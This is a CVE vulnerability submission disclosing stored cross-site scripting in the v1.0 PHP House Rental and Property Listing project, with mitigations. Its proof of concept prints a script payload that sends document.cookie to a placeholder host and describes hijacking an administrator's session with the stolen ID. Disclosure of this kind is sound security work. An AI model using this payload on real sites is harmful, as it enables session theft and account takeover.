**CVE ID:** [Reserved ID - To be assigned by CNA]

---
### **CVE Submission**

**Title:** Stored Cross-Site Scripting (XSS) in House Rental and Property Listing Project PHP,MySQL v1.0 via `/app/list.php`

---

### **Overview**
A stored Cross-Site Scripting (XSS) vulnerability exists in the House Rental and Property Listing Project PHP,MySQL (v1.0) due to improper sanitization of user-supplied input in the registration module. An authenticated attacker can inject malicious JavaScript payloads into the application, which are then stored and executed when legitimate users access affected pages, leading to session hijacking, credential theft, or other client-side attacks.

---

### **Affected Products**
- **Product Name:** House Rental and Property Listing Project PHP,MySQL  
- **Vendor Homepage:** [projectworlds](https://projectworlds.in/free-projects/php-projects/house-rental-and-property-listing-project-php-mysql/)  
- **Affected Version:** v1.0  
- **Fixed Version:** Not patched as of [date] (Unknown)  
- **Vulnerable File:** `/app/list.php`  
- **Software Link:** [Download Source Code](https://projectworlds.in/wp-content/uploads/2019/06/home-rental.zip)  

---

### **Vulnerability Details**
- **CWE-ID:** CWE-79 - Improper Neutralization of Input During Web Page Generation  
- **Attack Vector:** Remote  
- **Impact:** Medium (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) 
- **Vulnerability Type:** Stored XSS  

**Technical Description:**  
The `/app/list.php` component fails to sanitize user-controllable input fields (`fullname`, `address`, or other registration room parameters) before storing them in the database. This allows attackers to inject arbitrary JavaScript code, which is rendered unsafely on pages accessible to other users (e.g., admin panels, property listings, or user profiles).

---

### **Proof of Concept (PoC)**
**Steps to Reproduce:**  

1. 需要先注册一个用户，然后登入到系统。

![image-20250313235009389](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313235009389.png?x-oss-process=style/img-to-webp)

2. Navigate to the registration page: `http://[target]/app/register.php`.  

3. Inject a malicious payload into a vulnerable input field (e.g., `<script>fetch('http://[ip]/?cookie=' + encodeURIComponent(document.cookie));</script>`).  

![image-20250313235954178](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313235954178.png?x-oss-process=style/img-to-webp)

3. Submit the registration  Room form.  

![image-20250314002029758](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314002029758.png?x-oss-process=style/img-to-webp)

4. The payload is stored in the database.  

5. When an administrator or user views the affected data (/app/list.php), the script executes.  然后获取到管理员的PHPSESSID.

![image-20250314000638889](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314000638889.png?x-oss-process=style/img-to-webp)

6. 使用管理员的PHPSESSID登陆系统。

![image-20250314001022390](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314001022390.png?x-oss-process=style/img-to-webp)

**Observed Result:**  

![image-20250314001207922](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314001207922.png?x-oss-process=style/img-to-webp)

**Expected Result:**  
User input should be sanitized to prevent script execution.  

### Vulnerability location:

1. /app/register.php
   - fullname
   - mobile
   - alternat_mobile
   - email
   - country
   - city
   - landmark
   - rent
   - sale
   - deposit
   - plot_number
   - rooms
   - state
   - address
   - address
   - description
   - image
   - open_for_sharing

2. /app/update.php
   - fullname
   - mobile
   - alternat_mobile
   - email
   - plot_number
   - rooms
   - country
   - stat
   - city
   - rent
   - sale
   - deposit
   - accommodation
   - description
   - landmark
   - address

---

### **Impact**
Successful exploitation allows:  
- Stealing session cookies or authentication tokens.  
- Redirecting users to phishing pages.  
- Performing actions on behalf of authenticated users.  
- Defacing the application interface.  

---

### **Mitigation Recommendations**
1. **Input Sanitization:** Implement strict input validation and output encoding (e.g., using `htmlspecialchars()` or `htmlentities()` in PHP).  
2. **Content Security Policy (CSP):** Deploy CSP headers to restrict inline scripts.  
3. **Database Sanitization:** Sanitize all user inputs before database insertion.  
4. **Framework Safeguards:** Use modern PHP frameworks (e.g., Laravel, Symfony) with built-in XSS protections.  

---

### **References**
- **Vendor Advisory:** Not available.  
- **Software Download:** [home-rental.zip](https://projectworlds.in/wp-content/uploads/2019/06/home-rental.zip)  
- **CWE Documentation:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)  

---

### **Credits**
- **Submitter:** takakie  
- **Report Date:** [14/03/2025]  

